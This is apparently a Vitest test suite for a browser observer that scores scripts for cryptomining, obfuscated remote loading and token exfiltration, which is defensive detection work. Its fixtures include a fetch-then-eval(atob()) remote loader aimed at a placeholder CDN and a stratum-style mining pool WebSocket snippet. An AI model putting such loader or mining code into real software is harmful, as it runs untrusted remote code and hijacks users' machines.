import { describe, expect, it } from "vitest";
import { analyzeScriptAst } from "./ast-analyzer.js";
import { assessObservedScriptRisk } from "./observer.js";
import type {
  ScriptBehaviorEvent,
  ScriptRiskControls,
  ScriptRiskObservation,
} from "./types.js";

const NOW_MS = 100_000;

function assess(
  events: readonly ScriptBehaviorEvent[] = [],
  overrides: Partial<ScriptRiskObservation> = {},
) {
  return assessObservedScriptRisk({
    site: "https://compute.example.test/page?token=must-not-leak",
    nowMs: NOW_MS,
    events,
    ...overrides,
  });
}

describe("assessObservedScriptRisk mining detection", () => {
  it("reports a medium-confidence AST mining combination but never blocks", () => {
    const source = `
      const worker = new Worker("worker.js");
      const socket = new WebSocket("wss://pool.invalid/socket");
      socket.send("mining.subscribe");
      WebAssembly.instantiate(bytes);
    `;
    const result = assess([], { staticAnalysis: analyzeScriptAst(source) });

    expect(result).toMatchObject({
      mode: "observe-only",
      status: "active",
      site: "compute.example.test",
      decision: "suspicious",
      wouldBlock: false,
      riskScore: 70,
    });
    expect(result.findings[0]).toMatchObject({
      kind: "suspected-mining",
      confidence: "medium",
    });
    expect(result.findings[0]?.reasonCodes).toContain(
      "aggregate.mining-multisignal",
    );
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain("must-not-leak");
    expect(serialized).not.toContain("pool.invalid");
    expect(serialized).not.toContain("mining.subscribe");
  });

  it("combines sustained compute, WebSocket, and classified pool protocol", () => {
    const result = assess([
      {
        type: "cpu-sample",
        atMs: NOW_MS - 5_000,
        utilizationPercent: 94,
        durationMs: 20_000,
      },
      {
        type: "network-connect",
        atMs: NOW_MS - 4_000,
        transport: "websocket",
      },
      {
        type: "mining-protocol",
        atMs: NOW_MS - 3_000,
        protocol: "stratum",
      },
    ]);

    expect(result.decision).toBe("high-confidence");
    expect(result.findings.map((finding) => finding.kind)).toEqual([
      "suspected-mining",
    ]);
    expect(result.wouldBlock).toBe(false);
  });

  it("does not let low-value event floods evict mining evidence", () => {
    const evidence: ScriptBehaviorEvent[] = [
      {
        type: "cpu-sample",
        atMs: NOW_MS - 10_000,
        utilizationPercent: 94,
        durationMs: 20_000,
      },
      {
        type: "network-connect",
        atMs: NOW_MS - 9_000,
        transport: "websocket",
      },
      {
        type: "mining-protocol",
        atMs: NOW_MS - 8_000,
        protocol: "stratum",
      },
    ];
    const noise = Array.from({ length: 300 }, (_, index) => ({
      type: "network-connect" as const,
      atMs: NOW_MS - 7_000 + index,
      transport: "http" as const,
    }));

    const result = assess([...evidence, ...noise]);

    expect(result.decision).toBe("high-confidence");
    expect(result.findings[0]?.kind).toBe("suspected-mining");
    expect(result.graph.nodes.length).toBeLessThanOrEqual(20);
  });

  it.each([
    [
      "CPU",
      {
        type: "cpu-sample",
        atMs: NOW_MS,
        utilizationPercent: 99,
        durationMs: 30_000,
      } satisfies ScriptBehaviorEvent,
    ],
    [
      "Wasm",
      {
        type: "wasm-execution",
        atMs: NOW_MS,
        durationMs: 30_000,
      } satisfies ScriptBehaviorEvent,
    ],
    [
      "Worker",
      {
        type: "worker-count",
        atMs: NOW_MS,
        activeWorkers: 16,
      } satisfies ScriptBehaviorEvent,
    ],
    [
      "WebGPU",
      {
        type: "webgpu-compute",
        atMs: NOW_MS,
        dispatchCount: 10_000,
      } satisfies ScriptBehaviorEvent,
    ],
    [
      "WebSocket",
      {
        type: "network-connect",
        atMs: NOW_MS,
        transport: "websocket",
      } satisfies ScriptBehaviorEvent,
    ],
  ])("does not report a standalone %s capability", (_label, event) => {
    const result = assess([event]);
    expect(result.decision).toBe("observed");
    expect(result.riskScore).toBe(0);
    expect(result.findings).toEqual([]);
    expect(result.wouldBlock).toBe(false);
  });

  it.each([
    [
      "CPU and workers",
      [
        {
          type: "cpu-sample",
          atMs: NOW_MS,
          utilizationPercent: 98,
          durationMs: 40_000,
        },
        { type: "worker-count", atMs: NOW_MS, activeWorkers: 12 },
      ] satisfies ScriptBehaviorEvent[],
    ],
    [
      "Wasm image compression",
      [
        { type: "wasm-execution", atMs: NOW_MS, durationMs: 20_000 },
        { type: "worker-count", atMs: NOW_MS, activeWorkers: 8 },
        { type: "network-connect", atMs: NOW_MS, transport: "http" },
      ] satisfies ScriptBehaviorEvent[],
    ],
    [
      "WebGPU local matrix computation",
      [
        { type: "webgpu-compute", atMs: NOW_MS, dispatchCount: 5_000 },
        { type: "worker-count", atMs: NOW_MS, activeWorkers: 8 },
      ] satisfies ScriptBehaviorEvent[],
    ],
    [
      "ordinary chat WebSocket",
      [
        {
          type: "network-connect",
          atMs: NOW_MS,
          transport: "websocket",
        },
        { type: "network-send", atMs: NOW_MS, flowIds: [] },
      ] satisfies ScriptBehaviorEvent[],
    ],
  ])("keeps the benign high-load control %s below report threshold", (_label, events) => {
    const result = assess(events);
    expect(result.decision).toBe("observed");
    expect(result.findings).toEqual([]);
    expect(result.riskScore).toBe(0);
  });

  it("does not classify mining vocabulary without compute and transport", () => {
    const staticAnalysis = analyzeScriptAst(`
      const protocolExample = "mining.subscribe";
      const prose = "miner mining stratum";
    `);
    const result = assess([], { staticAnalysis });

    expect(result.decision).toBe("observed");
    expect(result.findings).toEqual([]);
  });

  it("does not call unrelated static feature co-occurrence high-confidence", () => {
    const staticAnalysis = analyzeScriptAst(`
      WebAssembly.instantiate(codecBytes);
      new WebSocket("ws://localhost:3000/live-reload");
      const documentationExample = "mining.subscribe";
    `);
    const result = assess([], { staticAnalysis });

    expect(result.decision).toBe("suspicious");
    expect(result.findings[0]).toMatchObject({
      kind: "suspected-mining",
      confidence: "medium",
      score: 70,
    });
    expect(result.wouldBlock).toBe(false);
  });
});

describe("assessObservedScriptRisk generic malicious-script signals", () => {
  it("reports an AST-confirmed obfuscated remote loader as suspicious", () => {
    const staticAnalysis = analyzeScriptAst(`
      fetch("https://cdn.invalid/payload")
        .then((response) => response.text())
        .then((payload) => eval(atob(payload)));
    `);
    const result = assess([], { staticAnalysis });

    expect(result.decision).toBe("suspicious");
    expect(result.riskScore).toBe(65);
    expect(result.findings).toEqual([
      {
        kind: "obfuscated-remote-loader",
        confidence: "medium",
        score: 65,
        reasonCodes: [
          "ast.dynamic-code",
          "ast.encoded-payload",
          "ast.remote-load",
          "aggregate.obfuscated-loader-multisignal",
        ],
      },
    ]);
    expect(result.wouldBlock).toBe(false);
  });

  it("requires an explicit behavior-graph correlation for exfiltration", () => {
    const correlated = assess([
      {
        type: "sensitive-read",
        atMs: NOW_MS - 2,
        dataKind: "auth-token",
        flowId: "opaque-secret-flow-id",
      },
      {
        type: "network-send",
        atMs: NOW_MS - 1,
        flowIds: ["opaque-secret-flow-id"],
      },
    ]);
    const uncorrelated = assess([
      {
        type: "sensitive-read",
        atMs: NOW_MS - 2,
        dataKind: "auth-token",
        flowId: "read-flow",
      },
      {
        type: "network-send",
        atMs: NOW_MS - 1,
        flowIds: ["different-flow"],
      },
    ]);

    expect(correlated.decision).toBe("high-confidence");
    expect(correlated.findings[0]?.kind).toBe(
      "sensitive-data-exfiltration",
    );
    expect(
      correlated.graph.edges.some((edge) => edge.relation === "flows-to"),
    ).toBe(true);
    expect(JSON.stringify(correlated)).not.toContain("opaque-secret-flow-id");
    expect(uncorrelated.decision).toBe("observed");
    expect(uncorrelated.findings).toEqual([]);
  });

  it("does not infer a flow when the network send predates the sensitive read", () => {
    const result = assess([
      {
        type: "sensitive-read",
        atMs: NOW_MS - 1,
        dataKind: "password",
        flowId: "causal-flow",
      },
      {
        type: "network-send",
        atMs: NOW_MS - 2,
        flowIds: ["causal-flow"],
      },
    ]);

    expect(result.decision).toBe("observed");
    expect(result.findings).toEqual([]);
    expect(result.graph.edges.some((edge) => edge.relation === "flows-to")).toBe(
      false,
    );
  });
});

describe("assessObservedScriptRisk controls and bounded observations", () => {
  it("caps duplicate reasons without allowing repeated signals to raise risk", () => {
    const events = Array.from({ length: 40 }, () => ({
      type: "cpu-sample" as const,
      atMs: NOW_MS,
      utilizationPercent: 99,
      durationMs: 60_000,
    }));
    const result = assess(events);

    expect(result.reasons).toContainEqual({
      code: "runtime.sustained-cpu",
      occurrences: 8,
    });
    expect(result.riskScore).toBe(0);
    expect(result.decision).toBe("observed");
  });

  it("ignores expired and future events regardless of input order", () => {
    const result = assess(
      [
        {
          type: "mining-protocol",
          atMs: NOW_MS + 1,
          protocol: "stratum",
        },
        {
          type: "network-connect",
          atMs: NOW_MS - 31_000,
          transport: "websocket",
        },
        {
          type: "cpu-sample",
          atMs: NOW_MS - 30_001,
          utilizationPercent: 99,
          durationMs: 60_000,
        },
      ],
      { windowMs: 30_000 },
    );

    expect(result.decision).toBe("observed");
    expect(result.reasons).toEqual([]);
    expect(result.graph.nodes).toHaveLength(1);
  });

  it("retains no state across navigation assessments", () => {
    const first = assess([
      {
        type: "cpu-sample",
        atMs: NOW_MS,
        utilizationPercent: 99,
        durationMs: 60_000,
      },
      {
        type: "network-connect",
        atMs: NOW_MS,
        transport: "websocket",
      },
      {
        type: "mining-protocol",
        atMs: NOW_MS,
        protocol: "stratum",
      },
    ]);
    const afterNavigation = assess([], {
      site: "https://next.example.test/",
      nowMs: NOW_MS + 1,
    });

    expect(first.decision).toBe("high-confidence");
    expect(afterNavigation.site).toBe("next.example.test");
    expect(afterNavigation.decision).toBe("observed");
    expect(afterNavigation.reasons).toEqual([]);
  });

  it.each([
    { masterEnabled: false },
    { featureEnabled: false },
    { preferenceEnabled: false },
    { sitePaused: true },
  ] satisfies ScriptRiskControls[])(
    "does not collect when a control disables observation: %o",
    (controls) => {
      const result = assess(
        [
          {
            type: "mining-protocol",
            atMs: NOW_MS,
            protocol: "stratum",
          },
        ],
        {
          controls,
          staticAnalysis: analyzeScriptAst(
            'new WebSocket("wss://pool.invalid"); "mining.subscribe";',
          ),
        },
      );

      expect(result.status).toBe("disabled");
      expect(result.decision).toBe("observed");
      expect(result.reasons).toEqual([]);
      expect(result.findings).toEqual([]);
      expect(result.graph).toEqual({ nodes: [], edges: [] });
      expect(result.wouldBlock).toBe(false);
    },
  );
});
